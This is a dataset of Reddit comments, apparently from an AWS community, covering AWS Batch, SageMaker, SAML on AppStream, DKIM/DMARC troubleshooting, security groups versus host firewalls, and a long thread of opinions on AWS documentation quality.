Perhaps a CloudWatch scheduled AWS Batch job (billed by the second, even cheaper if you run on spot instances) with pyodbc burnt into the docker image? You can still configure a retry strategy, SNS topics, CloudWatch triggers, and scale accordingly if you need more runtime/memory. 


You could also consider using AWS Athena to do your parquet conversions instead of pandas to see if it helps with speed and/or cost savings.


Can't say for sure if the above is best practice, just throwing out some ideas :)",1.0
g6z30y5,j1abon,"No, this is fantastic, thank you!",1.0
g6xybxf,j19dyu,[HTTrack](https://en.kali.tools/?p=443) might do the trick.,1.0
g6xybkc,j19twk,"I would not trust the response of anyone in here as they are likely unqualified to answer the question.  If the answer is that critical to you, ask a qualified attorney.",19.0
g6ygqv8,j19twk,"You need to do more research but you'll find the USA only hosts immediately lost being the go to place with the Patriot Act and these kind of questions.

The response was move data centers out of US jurisdiction. 

Is that enough assurance? For some people yes, for others no.",2.0
g6xzwky,j19ugd,Most data scientists build their machine learning code in Jupyter. It's the easiest way to see cause and effect between code and data.,3.0
g6y9a2d,j19ugd,"If you’re doing some machine learning project (assuming you have your training data in an s3 bucket or something), you want to write your model, train/test/train/test it, tune it, then deploy it to start serving inference traffic. You can set up all of those functions on vanilla ec2, but everyone ends up doing basically the same work. So sagemaker makes the environment for those operations a push-button task. 

jupyter and python is the de facto standard for data science and ML at this point. So thats what sagemaker offers as a development environment. You dont have to use it, but thats what most data scientists want.",2.0
g6ygdy9,j19ugd,"Jupyter notebook is just a interface. 

Imo, you should never do complex stuff in the notebook but use the notebook for orchestrating. 

Check out script mode in sagemaker to do so.",2.0
g6ybkta,j14vrb,"You cannot pass the SAML token into the instance. So even if the APP inside the session is SAML enabled, you will need to auth a second time. If the AppStream fleet was domain joined, you can install the Okta agent in the image and use it to seamlessly auth into SAML apps. The tradeoff is that your users will be prompted for their domain password when the session starts, so you they will still have two login prompts.",1.0
g74zrl8,j14vrb,"Yes, that is what I was afraid of.

I’ve been reading up on options at the fleet level. I’m wondering if there is a way to use the scripts feature to auto-login a user?

https://docs.aws.amazon.com/appstream2/latest/developerguide/use-session-scripts.html#run-scripts-before-streaming-sessions-begin

It seems unlikely unless I had some kind of identification I could pass to the idp server. Really don’t want to have to create an AD if the is a better way.",1.0
g76juph,j14vrb,"Unfortunately, I do not think there is. SAML tokens are intentionally designed not to allow for this kind of re-use. The token passed to the auth gateway is specific to the relationship between your IDP and IAM. With Appsteam, you're logged in as a generic user if you're not using domain join as well. So your options are limited unless the auth model for the app is pretty basic.",1.0
g6xx739,j17bhu,"No, they should then be in separate Target groups",3.0
g6xk3mt,j17bhu,I don't think so.. but why not just let them all take traffic?,1.0
g6xmlld,j17bhu,probably this is something you want to use aws route 53 for with traffic routing rules,1.0
g6y4hkk,j17bhu,Agree. Something like weight of forward in route 53 Alias or something,1.0
g75mikz,j17bhu,"Yes, Using  **Weighted routing. S**ome dns services offer  **Weighted routing.** 

&amp;#x200B;

OP need to have 2 load balancer though.",1.0
g6zpabd,j17bhu,Because the lifecycle of the target handles this no need. If an instance doesn’t pass health checks it’s removed. Simple solution,1.0
g6xi082,j16oio,"So do you have that random dkim sig in your dns?

Can you find out who added it?

I doubt very much AWS would tell you which of their customers were using a specific key. They'd have to trawl through millions of accounts to find it. And then release the email address of a customer to a third party they have no contract with. What if you're just trying social engineering on their admins? Or something. (After they mistakenly let their dns expire and you claimed ownership of it)

Even if you did have a contract, I doubt they'd tell you. But you can sign up for an account for free. Not start any infrastructure and just raise a ticket. As a free tier user you'll likely get no help at all though.

I assume you aren't seeing this email yourself? If you were you could report it as abuse and eventually the sender would get blocked in aws and have to send a resubscribe request to users. Or you could just ask a recipient what it was about. 

Presumably you're just getting dmarc reports with it in. Can you find a friendly domain that gets the mail and ask them to help you out?

I think you're going to have to block the key from your dns and wait to see who squeals.",3.0
g71nd1y,j16oio,"&gt; So do you have that random dkim sig in your dns?

Not in my DNS, in my DMARC aggregated reports.  I'm not about to add them to DNS without knowing the source of the email.  It's not one used by the one known SaaS provider that uses AmazonSES and before I flip my DMARC over to quarantine, I need to try and identify the email to figure out where the heck the email is coming from.  As much as I might like to, blocking it and seeing who screams is problematic - I've already had the situation that when I enabled DMARC checking on the mail gateway that emails from &lt;very large consulting firm&gt; to a number of our general managers and our CEO got quarantined because they weren't DKIM signed and their DMARC policy was configured to reject emails that fail DMARC verification.  Fortunately I'd set the gateway to quarantine regardless of whether the DMARC record was set to reject or quarantine.  Interfering with these emails would be political dynamite as &lt;very large consulting firm&gt; is undertaking an organisational review at the present time.

&gt; I assume you aren't seeing this email yourself?

I haven't found them so far.  Unfortunately our email gateways are (a) very old, (b) very out of date, (c) not upgradable and (d) not particularly user friendly.  They're still (just) under support, but we're going to be replacing them in the near future - but we have too many projects under way at the moment and not enough staff to complete them, so it's a little time off yet.  (I still have to finish getting DKIM and DMARC set up then manage the transition from an old Citrix environment to a new one that we've just had some consultants set up for us, then a ""minor"" redesign of group policy - if there is such a thing at the same time as starting to implement security awareness training and starting some internal phishing campaigns to find more of the people who really need the training)

&gt; I think you're going to have to block the key from your dns and wait to see who squeals.

Management aren't going to like it, but I'm running out of options.  I have two last providers to work with to get DKIM and SPF fully aligned before I can switch over to a quarantine policy and start listening for the screams from the staff that have gone off and done their own thing.",1.0
g6xi6r8,j16oio,"Contact your SaaS provider and have them submit the support request. There is effectively no way to reach AWS or Azure support for a different account. Even if you have an account, they wont engage in questions on anything unrelated to your account. 

Option 2. Use a different SaaS.",3.0
g6xik74,j16oio,"Exactly. This is what you pay them for. If they can’t provide good service, use someone else.",1.0
g6xqww7,j16oio,"That's the problem - I don't know *who* the SaaS provider is for the extra signatures.  Our first SaaS provider has their application set up correctly and all the keys are published 9n DNS, but 8 have no idea who the other emails are originating from. These are based on DMARC reports, so I don't get to/from information on the emails.",1.0
g6xu41j,j16oio,"The point of SPF, DKIM, and DMAC is so when someone tries to send email on behalf of your domain, it fails. As long as its failing, you are good. If its succeeding, then you need to check which DKIM key its using. Hopefully you have a unique key with each peer relationship, so you can track it down.",1.0
g6xcueo,j15mil,"Consider using an API Gateway instead of a Load Balancer for this use case. API Gateway supports [custom domain names and TLS certificates](https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api-custom-domain-names.html) provided by ACM.

API Gateway also supports [connecting to ECS tasks via VPC Links](https://docs.aws.amazon.com/apigateway/latest/developerguide/http-api-develop-integrations-private.html#http-api-develop-integrations-private-Cloud-Map), using Cloud Map for service discovery.

API Gateway is very inexpensive (starting at $1 per million requests, excluding Data Transfer Out). Depending on your usage, you may fall well under the free tier for the first 12 months. If you use a VPC Link, the pricing is the same as PrivateLink, which starts at 1 cent per hour per AZ.",2.0
g6xdsc2,j15mil,"Thanks for responding! I'm actually developing a GraphQL API, so I was looking at AppSync but after some investigation I reluctantly gave up on it because it feels like it will make local development iteration a pain. I've seen some hacky mock/emulation stuff they have but it's incomplete and AFAIK doesn't support my backing store (RDS/Postgres).

I guess API Gateway is a bit better in the sense that I would simply expose a `/graphql` endpoint with my entire graphql server in it, but part of my reluctantly giving up on AppSync is the promise of greater flexibility, for example it wouldn't be as straightforward for me to write my own graphql subscription websockets I believe. I'm aware API Gateway supports websockets (I think), but I've read it's not ideal.

Anyway, believe me I was trying hard to go with something serverless but in the end gave up on it and would prefer the freedom/flexibility and ease of local development iteration of my own server, so going with some weird API Gateway hybrid feels like the worst of both worlds, although it would help me in this situation with the ACM cert.

Appreciate the response though, maybe I'm thinking about it incorrectly.",1.0
g6xbxfq,j15mil,You can add your ECS task/service as another origin for CloudFront. Just make sure the caching policy is correct so your API doesn't get improperly cached.,1.0
g6xd8oo,j15mil,"Thanks for responding. It asks for a domain name, and I'm not sure how I would get one on an ECS task? I guess I can't without a load balancer?",1.0
g6xddn8,j15mil,Assign one using Route 53. Get your task/service IP and create an A record for it.,2.0
g6xdhiq,j15mil,"Ahhh it's that simple? I guess I only would need to worry if the backing ec2 instance is replaced and I get a new IP?

Or can I mitigate that by assigning an elastic IP so that the instance I get always has the same IP? (assuming that's how that even works).",2.0
g6xdjcj,j15mil,"Yep, elastic IP is the solution here.",2.0
g6x967y,j13bd7,"I never configure a firewall on the host and rely on security groups. I'm aware that security comes from layers. The more you have the better you are secured and with that mantra, it might make sense to use both. But with both enabled I expect many frustrating moments when you open port from the security group and don't remember changing the ufw configuration. I see this as a balance between security and usability.",3.0
g6xbsvb,j13bd7,Yeah feeling that heavy right now. Thank you,1.0
g6x4g1e,j13bd7,Security groups handle it very well. I usually set uwf as a back up tho,2.0
g6x2665,j13bd7,"My opinion is that the instance firewall doesn't really buy you much. Especially since it's all strictly IP based. Security groups can have other security groups in their rules, so are a bit more expressive than you can get with ufw.",1.0
g6xigv5,j13bd7,"I like the idea of the layering.  My concern is that this might be hard to track down should you run into a problem.  If someone needs another port, but they copy and paste the ufw code without looking, they are going to be in for a very bad time.",1.0
g6xunl8,j13bd7,"Best practice is to disable instance firewalls. It just creates hard to find errors, especially if you have multiple people in your team.

If you need an extra layer of defence, configure a network ACL.",1.0
g6xy457,j12tvm,"Lots of data centers / offices around the word. Our setup is transit gateway for all of our VPC inter connectivity. There’s a TGW in region that all VPCs in that respective region connect to, and then each of the TGWs peer with each other. We have IPSec from each office / DC to their closest TGW peer (eg east coast US offices connect to n. Virginia, west coast to Oregon, Bangalore to Mumbai, Eastern Europe to Frankfurt and Western Europe to Ireland / Paris respectively). Once each office hits their local TGW, they use peering to connect to any other VPC globally.

Single entry point to AWS for each location and then they leverage the backbone from there. It greatly simplifies routing, as we can effectively stick a 10.0.0.0/8 route pointing to TGW, and TGW will route it to the appropriate next hop (another vpc, vpn, or peer).",1.0
g6ylgb3,j12tvm,transit gateway via terraform,1.0
g6z6off,j12tvm,"Same here. Are you connecting any partner DX ports to other clouds, etc.? We've got a BGP session back to on-prem over dedicated DX links.",1.0
g6wpcwj,j129il,"My experience has generally been different — I’ve usually found that they walk me through what I have to do really well, without skipping steps and with links to more detail where needed. Though also I’ve seen exceptions to that.",139.0
g6wxtsz,j129il,"Since the service teams at AWS are literal silos of production, the quality of the documentation varies wildly.",65.0
g6x31we,j129il,This has been exactly my experience as well.,19.0
g6xmtuq,j129il,"&gt;Since the service teams at AWS are **literal silos of production**, the quality of the documentation varies wildly.

You mean like [this](http://3.bp.blogspot.com/-eMh9sF6mkYs/VHhQKmcBl0I/AAAAAAAAAGs/nIOnvp9qm2I/s1600/Grain_Silos_at_Manor_Farm_-_geograph.org.uk_-_1706973.jpg)? How do they program, is that Amazon's new AI program?",-5.0
g6ynk6x,j129il,"Yeah, they just throw a bunch of people in there and the ones that keep crawling to the top of the pile of bodies and not suffocating to death are given access to a laptop for 5 minutes a day to either code or document code, but not both. NEVER BOTH!",2.0
g6x6zy3,j129il,"This has been the same for me with everything except the AppSync CloudFormation docs. Those are horrendous because they don't actually give good example so a lot of the format for the properties I had to figure out on my own. 

I have been working on a pull request to make them better now so someone doesn't enter the hell I did.

Like look at the examples here. 

https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-appsync-resolver.html

Just laziness making all the properties references to stack params.

Compared to lambda:

https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-appsync-resolver.html

None are stack parameters.",4.0
g6xmaw0,j129il,"For any less-popular service, I definitely use the service's actual API/usage docs alongside the cloudformation docs. The service team is almost always going to have more to say that get didn't copied into the CFN resource page, or was written afterwards. Maybe they should do more cross linking on their own

BTW, both of your links appear to be the same",4.0
g6wr8o7,j129il,"I've found that documentation tends to fall into one of two categories:

1. ""Hello World"" / getting started type things that get you up and running with a very rudimentary version of the service.
2. Full reference material if you know exactly what you need to do but just need to remember what that one parameter name is.

I've been frustrated about a lack of middle ground between those two, and yeah, having more examples would help a lot with that.",46.0
g6yy42q,j129il,"When Athena shipped their reference was terrible. Most of it was generic links out to the projects Athena was built on, rather than being actual AWS documentation. So searching for a datatype reference brought me to some other page, that had version specific information that I'd need to cross-reference with Athena to try and answer. 

&amp;#x200B;

That was super frustrating. It may be better now, I haven't updated that project in a while.",2.0
g6wsbb5,j129il,"Yes, that's definitely the case for me too. I hadn't looked at it that way. It's very frustrating. I didn't have nearly as much difficulty with gcloud or azure.",0.0
g6woh1o,j129il,It needs more real world examples with console  configuration or CLI commands,59.0
g6wvu32,j129il,Have you filled out the feedback form? I’ve found gaps or mistakes in some of their examples and they’ve been fixed quickly.,10.0
g6xkm2u,j129il,\+1 on using the feedback form. We listen to feedback and will implement fixes. Please submit feedback and feel free to DM me to escalate as needed.,14.0
g6ynyrc,j129il,"I have to say my experience has been consistently great: I get a personal email back promptly. 

To be honest, it’s better than the support flow since it doesn’t break the reply button.",2.0
g6xl2b8,j129il,I second doing this...I work on an AWS team and there's been a few times I submit feedback on the public site instead of any internal ticketing and it's been as quick.,5.0
g6wzrdi,j129il,A couple of times. It does usually get fixed within a week if not sooner.,2.0
g6y0kve,j129il,"I feel like whenever they do a task, they should have the CLI command right below it. Instead you have to go to a whole different document to learn the CLI command.",7.0
g6y4nmu,j129il,That would be helpful.,2.0
g6wp93p,j129il,"And it jumps around way too much, I just realised. In order to do one thing you need to go through 5 other things. And again, oh my god it's so verbose. Anywhere there is an opportunity for verbosity, it is seized upon wholeheartedly..... I mean... they do it a lot.",28.0
g6wqhxe,j129il,"As someone whose pet peeve is unnecessarily verbose technical documentation, thanks for making me feel not alone 😂

With that said, go take a nap or a break and come back to your docs when you've got a fresh head for it!",9.0
g6wuycg,j129il,And don't forget they almost always start off with how to create an AWS Account,8.0
g6x6uiq,j129il,Let’s take this opportunity to discuss the shared responsibility model of AWS,16.0
g6y1pki,j129il,Some people seem to need a reminder. Unfortunately those people aren't likely the ones going through this documentation; they are more likely to follow a random tutorial online.,3.0
g6x1ovy,j129il,I agree. And why does like every doc provide examples where your input json is a blasted file. Like I'm going to write data from memory to disk back to memory into the cli in my damn scripts.,3.0
g6wpjs8,j129il,"The docs are way too dry.  Not enough examples or usage.  With azure, you at least get a contoso example.

Right now I'm having trouble with eventbridge and have to create support tickets.  For example I read the doc about how to send a message to eventbridge via boto3, and the response that I get shows that there are 0 errors, but the message isn't being routed and there's nothing in cloudwatch.  Opening up permissions doesn't fix, and the product doesn't have enough blog posts by 3rd party users to help.  So I'm just stuck.

Another problem is that SEO with aws is so good, the top 30 search results all point to aws documentation, so you have to really have to search to find help.  Its beyond frustrating to try new things with aws.",23.0
g6wtolo,j129il,"Yes, the SEO! I would Google things and their top results were not very helpful. Everyone's having all the same problems I've noticed but just seem better at putting it into words. I'm glad it's not just me. Hopefully someone there gets to see some of these.
I just realised, I also don't like the way the navigation is on left. I feel like I'm just lost in tree land. I think that's another thing I just realized, things are broken into such large lists. Have you ever run 'aws help'? You have to hold down enter in Windows to make it scroll. It takes a solid 30 seconds for that list to scroll and then you can get the help on the subcategories.
I think this is actually like the problem of choice. I remember hearing when I was young about research that went something along the lines of... given the choice between 3 brands of peanut butter versus something like 15 brands of peanut butter, the group offered 15 wouldn't buy any peanut butter because there were too many to choose from.
It's like the categorization is too big to find anything. But then I think they have so many things, and then I remember, yeah do does everyone else who does cloud and they don't have docs this bad.",6.0
g6x6em8,j129il,I started adding stackoverflow to my aws related searches. Took me way too long to figure out that part. It was always pages and pages of aws docs that I already looked at and was not able to find my answer.,8.0
g6xy38t,j129il,"And then you have the issue of SO pages been flooded with the same question worded 15 different ways, with maybe 2-3 answers that might be relevant or not depending how old they are ....",4.0
g6y08io,j129il,This is a great idea that I somehow never thought of.,2.0
g6ytx2g,j129il,"Through which service are you sending messages? The userguide shows: 

* Lambda functions
* Amazon EC2 instances
* Streams in Amazon Kinesis Data Streams
* Delivery streams in Amazon Kinesis Data Firehose
* Log groups in Amazon CloudWatch Logs
* Amazon ECS tasks
* Systems Manager Run Command
* Systems Manager Automation
* AWS Batch jobs
* AWS Step Functions state machines
* Pipelines in AWS CodePipeline
* AWS CodeBuild projects
* Amazon Inspector assessment templates
* Amazon SNS topics
* Amazon SQS queues
* Built-in targets: EC2 CreateSnapshot API call  
, EC2 RebootInstances API call  
, EC2 StopInstances API call  
, and EC2 TerminateInstances API call
* The default event bus of another AWS account
* Amazon API Gateway REST API endpoints
* Amazon Redshift clusters (Data API statement execution)

Did you try any of the tutorials in the EventBridge guide, [https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-tutorials.html](https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-tutorials.html),

* [Tutorial: Relay Events to Systems Manager Run Command](https://docs.aws.amazon.com/eventbridge/latest/userguide/ec2-run-command.html)
* [Tutorial: Log EC2 Instance States](https://docs.aws.amazon.com/eventbridge/latest/userguide/log-ec2-instance-state.html)
* [Tutorial: Log Auto Scaling Group States](https://docs.aws.amazon.com/eventbridge/latest/userguide/log-as-group-state.html)
* [Tutorial: Log S3 Object Level Operations](https://docs.aws.amazon.com/eventbridge/latest/userguide/log-s3-data-events.html)
* [Tutorial: Use Input Transformer to Customize What Is Passed to the Event Target](https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-input-transformer-tutorial.html)
* [Tutorial: Log AWS API Calls](https://docs.aws.amazon.com/eventbridge/latest/userguide/log-api-call.html)
* [Tutorial: Schedule Automated Amazon EBS Snapshots](https://docs.aws.amazon.com/eventbridge/latest/userguide/take-scheduled-snapshot.html)
* [Tutorial: Schedule AWS Lambda Functions](https://docs.aws.amazon.com/eventbridge/latest/userguide/run-lambda-schedule.html)
* [Tutorial: Set Systems Manager Automation as a Target](https://docs.aws.amazon.com/eventbridge/latest/userguide/ssm-automation-as-target.html)
* [Tutorial: Relay Events to a Kinesis Stream](https://docs.aws.amazon.com/eventbridge/latest/userguide/relay-events-kinesis-stream.html)
* [Tutorial: Run an Amazon ECS Task When a File Is Uploaded to an Amazon S3 Bucket](https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-tutorial-ecs.html)
* [Tutorial: Schedule Automated Builds Using AWS CodeBuild](https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-tutorial-codebuild.html)
* [Tutorial: Log State Changes of Amazon EC2 Instances](https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-tutorial-cloudwatch-logs.html)
* [Tutorial: Download Code Bindings for Events using the EventBridge Schema Registry](https://docs.aws.amazon.com/eventbridge/latest/userguide/eventbridge-tutorial-schema-download-binding.html)",0.0
g7d26dt,j129il,"It took a while to troubleshoot. I had to go through every step in the chain.  My problem was permissions.

I was just able to fix it. My setup is sqs -&gt; lambda -&gt; event bridge -&gt; sqs or sns depending on rule.  The lambda that triggers event bridge has a lot of if/else depending on what's in the message.  So I had to edit it to write to console in every if/else so that I can see what the lambda was doing.  Then I saw that it was triggering event bridge, and rule did have invocations but the message wasn't reaching the destination sqs/sns.  So I added cloudwatch as another target.  Cloudwatch was receiving the message, so the problem was security.  The documentation for eventbridge states that if you add something as a target, it will configure the permissions for you.  So I removed and re-added my targets and things worked.

So I orginally deployed all of this via cloudformation but did my troubleshooting via console, so now I need to spend an hour or so fixing the cloudformation based on what I learned.  It would be nice if eventbridge could write to cloudwatch, instead of just a invocation metric.",1.0
g6wtpzg,j129il,"The issue I find isn't that the docs are bad, I actually find them quite good, it's that getting to the right ones I need is easier said than done

I'll look through the documentation for a given service and not find what I'm looking for and then come across someone linking to the exact page I need in a random stackoverflow or reddit comment usually",8.0
g6wso9g,j129il,"They're not amazing docs that's for sure... They're definitely too verbose and a little scattered-feeling at times.

I think of comparing just like react docs or angular docs and they're SO much cleaner... and I don't think it's because the subject matter lends to cleaner documentation, i think aws docs are just not great.",13.0
g6wt6uo,j129il,"React has outstanding documentation. But I'm not sure it's really a fair comparison. React is one product designed to, more or less, do one thing really well. It has a clear philosophy behind it that and form follows function.

AWS is a significantly more scattered set of loosely related services from a *huge* group of people working on them.",7.0
g6wtx0f,j129il,"like I said, I disagree - I don't think it's the subject matter. Each service is unique and pretty specific to do a certain thing. The docs are just too wordy, there's a paragraph for every small thing, they can reduce so much and it'd be way better.",3.0
g6wuc4p,j129il,"That's a good point, their service model is sort of a graph which would add a lot of complex interplay between services. But I still think there are a lot of good points here too. I feel like there's still a lot of room for improvement.",1.0
g6wsx8b,j129il,"I've found them to be moderately good, but I imagine it various a lot by what problem you're dealing with.",5.0
g6wtrck,j129il,AWS provides good documentation but not good examples. They have the first half down but a good example always helps in the end. Azure usually provides a good contoso example for each thing so it helps a lot.,13.0
g6wshnf,j129il,"I don't know what you've worked with before, but if the docs are anything let me as good as those for AWS you've been very lucky.
I think your issue is that the docs aren't usually goal orientated. This means when you come to them with a specific task you want instruction on, they either don't show you exactly what to do, or it's buried down somewhere.",4.0
g6wvjh0,j129il,"That is what you generally want yes, to do things. I don't need a computer science lesson, I need to do things. I already know how everything works. Where do I have to go to change permissions? Where do I go to change this setting? I can't find anything because there's too much of every little detail that isn't important.

The day to day user isn't an absolute beginner on every single aspect, they know generally how most things work they just need one or two more things but they're hidden in the forest of trees you would have to kill to print their documentation.",-1.0
g6wu80s,j129il,"I think the biggest issue with the docs is that they are not consistent.  This is I'm sure because of various authors on them and I've found that some assume you have a certain knowledge level while others have confusing wording and others tell you what to do but don't actually tell you what you are doing.  They can't always give you the secret sauce either because it's proprietary knowledge that could reveal how things work behind the scenes.  In general, however it seems to be enough to get the job done.  Except for Trusted Advisor for multiple accounts.  I just clicked on stuff in the console after reading docs and getting a general idea of where I should be.  It still makes no sense to me.",3.0
g6wxr42,j129il,"It's weird, the bigger the org the more they need librarians and internal publishers.  What do we see instead (if we are lucky)?  Dedicated technical writers... that's it.",3.0
g6wzkha,j129il,Sometimes it feels like you need to already know how the service works before you can read its manual. Then it's like a really long-winded reference manual with a search that never finds what you're looking for.,3.0
g6x0moh,j129il,Oh man I feel like they have the best docs in the game. Ever read an Azure doc?,3.0
g6x7mgz,j129il,"It’s often quite buggy, and makes assumptions about what the reader may know about not obviously connected services that nevertheless are critically important to getting the service you are working with to operate correctly.

Be the change you want to see though; I have submitted and had accepted many patches to the official documentation.",3.0
g6xg22b,j129il,"AWS has the worst doc among major cloud providers, because others have virtually no doc at all",3.0
g6xnqos,j129il,"examples of real world code are very much lacking - they seem to focos on the simplest use case, which might be the most common, but sometimes doesnt answer a question on what an argument is or the syntax required",3.0
g6x4ma6,j129il,"Coming from the Microsoft world I found the docs to be pretty awful. Not enough details for some things and then way too much detail for others to the point where I can’t even get the basics. They almost never contain examples of which are the most useful to me because often I just want to know what the dang API is expecting.

AWS should learn from MSDN and MDN.",6.0
g6wvb9y,j129il,"AWS is expensive because it is targeting professionals. The documentation expects you to know what you're looking for and is not going to hold your hand when you get there. 

Compare with Digital Ocean, a much more user friendly and lower barrier to entry ecosystem. Their docs are full of excellent tutorials.",6.0
g6wwv4s,j129il,"I know what I'm looking for, I'm trying to find where it is. It's not a field of science, it's an instruction manual from this brand of toaster manufacturer. Lol",0.0
g6wy8qs,j129il,"Yeah but to say AWS docs are bad is rather prissy. 

Try reading through 600+ page silicon datasheets written by 3 separate non native english speakers 5 years apart",5.0
g6wr05d,j129il,"Most of the documentation is reference material. It's assumed you already know what you're doing, and you want a nice dry reference to get you on with your busy day. Maybe you are really looking through tutorials or training materials? They have a bunch of those too, you just need to make sure you're reading the right type of docs for what you're trying to achieve.",2.0
g6wv5ah,j129il,"I think the docs are fine actually. Sometimes I find they didn't mention something I wish they did, but for the most part I can get everything I need from their docs.",2.0
g6x2zb5,j129il,Best AWS docs are the boto docs change my mind.,2.0
g70beg5,j129il,"These are autogenerated, so I would expect you to read the same words in the same order in every SDK and the API reference for that same service.

&amp;#x200B;

Not that this invalidates your point, just an observation",1.0
g6xj6oz,j129il,"For the actual properties of the code itself, I have found them great. For figuring out practical use-cases, I have found I have needed to dig.",2.0
g6xl3zx,j129il,"I have the feeling that every docs of a certain service is written by different standards. Some docs I find very detailed and just what I needed. But sometimes with other AWS services it's way to verbose, not detailed and a lack of examples. 

For example I recently used the Database Migration Service and needed to migrate a on-prem Oracle to RDS. There was a step-by-step walk-through available that guided me to exactly what I needed.",2.0
g6xrz6u,j129il,"Just curious, what companies technical docs do you find better? As far as technical docs go I find AWS to be one of the better ones. 

Only gripe, like others have said is consistency among services.",2.0
g6xupdh,j129il,"In my experience AWS docs are just difficult to read. They have all info in place but it's scattered over pages sometimes with little to no sense and, worst of all, they cover only the basics.

Usually to understand something I have to read in parallel the AWS docs, boto3, and java clients API docs, and google for my slightly different use-case.",2.0
g6y9ftl,j129il,Interesting perspective. I find AWS docs to be sort of my model for what good docs should be.,2.0
g6ynpqm,j129il,"Perhaps you can give us a specific example. Something like ""I was trying to ..."". I looked HERE and HERE, but could not find the answer. Be aware that documenting every conceivable permutation of configuration options is never possible, nor sensible. The real trick is to document common use cases, or use cases that seem to trip up a good percentage of users. You are aware that all services include both a guide and reference (API) docs.",2.0
g6wvh7c,j129il,"My experience with the docs were the same.. at first. 

The difference between the aws docs and perhaps other docs you are used to is that the aws docs are designed with detail in mind. You do have to invest time in reading and understanding the docs. They give a lot of detail, most of which you don’t need right away, but when you do, every edge case is detailed. You don’t have to look elsewhere. 

With some other services, you can generally google for a quick solution and be on your merry way. Aws docs are an investment that won’t necessarily pay off until later down the line. 

I’ve learned to set aside an hour or so for some deep technical reading when I need to read the docs, preferably with a nice cup of tea. Try it, you’ll come away with a deeper understanding of the service than if you skim the docs.",5.0
g6wwbah,j129il,"But not everyone needs a deep understanding. For a good read, yeah I'll give you that.  But if you're looking for something specific, it's a needle in a haystack. That's why I go to the docs usually, because I can't find the setting. I'm not actually looking to understand, I'm trying to find the button that was over here in Azure or over there in gcloud.",5.0
g6xi8jv,j129il,"This comment is such bullshit. If you really believe it you either work at AWS, or you haven't really used it heavily.",2.0
g6wuled,j129il,"They're not noob friendly at all, thats for sure. I was fresh out of college on a team building an app on AWS, and i learned quickly that those docs were completely useless to me.",2.0
g6xfvdr,j129il,A trick a friend showed me is that on github the documentation is a bit better.,1.0
g6xoiw5,j129il,"I actually love their docs! More often than not (in other systems) I complain about Lack of documentation, aws docs usually give me everything I need and yeah they are convoluted, but I've learned to google the very specific thing I need help and very quickly find it. My advice is to learn to read their docs and stop looking for copy-pastable examples",1.0
g6xpahv,j129il,"There are different kinds of documentation for AWS. For a single API, you may find the documentation about its REST api, CLI command, SDK (for different languages). If you use Google, it may bring you to either one of them.",1.0
g6xyr4k,j129il,"The reason you don't like them is because AWS is to wast and the documentation dose not give a good frame of reference in the begging of each documented service. Which makes it very hard to understand what you read, because until you don't understand how the service works, the dry step by steps are meningitis, you don't know how to interpret the complexity that they are explaining. 

But this is also true for all the documentation pages out there. In my opinion the AWS Docs are the 2nd best after the Docker ones. The Docker documentation dose exactly what the documentation should do, give you a frame of reference, so you know what are you reading. You can go from 0 to 100 with docker within 5h.

Where with AWS, you have to first understand how a service work the way it works, and then the documentation because straight forward. Aside from obsolete UI description etc.",1.0
g6y6753,j129il,"It depends sometimes. Some of the docs are too verbose and talk about minor details for an hour. Other docs are too scarce and literally just say ""This exists"". 

One of the biggest pain points is the missing examples in a lot of documentation. Right behind the discrepancies in actual code (like aws cf deploy not accepting a parameters file but every other command does).",1.0
g6yhef3,j129il,"AWS just isn't the ""Click through the wizard and get cloud ops"" ecosystem.

They provide a toolbox, they clearly define the scope and function of each tool, and it's up to you to hire a cloud architect familiar with the tools to make a solution.",1.0
g6yl7iy,j129il,"I've actually found AWS docs to be pretty concise, easy to find, and helpful.  Very seldom do I have to look elsewhere for answers.",1.0
g6ylb8u,j129il,IMO they need to add top few most common usage case examples.,1.0
g6z2e58,j129il,"Personally, I love the AWS docs.",1.0
g6z7xok,j129il,i used to hate the docs. i think they are bad for beginners. but once you start to wrap your head around aws concepts they become much more useful. still it is complicated.,1.0
g6zegt9,j129il,This is my latest PR that exactly shows what is so bad about the documentation: https://github.com/awsdocs/aws-lambda-developer-guide/pull/208 - a small that introduces lots of unclarity in the whole explanation. We also will have to see how many months will this PR stay open.,1.0
g6zhtw5,j129il,"When I need documentation regarding a specific topic, it's been great. However, actually reading a manual is a different story; I'm not sure if it's the dryness of the manual or if my attention span is just fading over time. I can generally do readings in small doses though without any issues. It's probably just the material itself rather than anything that the authors are doing wrong.",1.0
g7f0zwc,j129il,"AWS documentation is not the quality it should be for a company with the resources of Amazon. If the quality of their documentation is a reflection on the quality of their web services offerings, there should be major concern.

Simply correcting the grammar in the documentation would be a huge improvement. Given that much of the writing is by engineers with various backgrounds and grammatical expertise, does not remove AWS's responsibility to to fix the mistakes. Certainly, a few good technical writers could improve AWS documentation in short order. I suspect this is not their goal.

AWS is marketing a product consisting of services. They depend upon abstraction to sell their product offerings to customers. ""abstraction"" is: the process of removing physical, spatial, or temporal details or attributes in the study of objects or systems. Generalization is a form of abstraction. This is not really compatible with quality documentation. By obscuring the details of how they build their services, they have a real balancing act providing the level of detail required to convey adequate information. One of their favorite terms is ""associate"". This term applies to many services and is a loose concept they use to describe many operations.

If they stated in their documentation that a NAT gateway is simply an IP tables configuration in a Linux instance, people would be less willing to pay. Details which are very helpful in understanding how a system actually works is not in alignment with their marketing strategy of making things simple and let letting AWS worry about the details of the framework.

I think AWS is making a mistake not making quality an important goal as reflected in their documentation. The documentation is directly customer facing and could be a wonderful showcase for the quality in their service offerings. Given similar products in the marketplace, I think people will gravitate towards the product with good documentation.",1.0
g6x0kxj,j129il,"I appreciate the fact that they're fairly comprehensive, at least as far as API documentaation is concerned. Yes, it's more reference documentation than tutorial documentation. But frankly, tutorial documentation annoys me nowadays. I know what has to be done to e.g. spawn up an instance. Just give me the exact stuff I need to poke at the API to make it happen, already, rather than making me chew through hundreds of pages of tutorial information. 

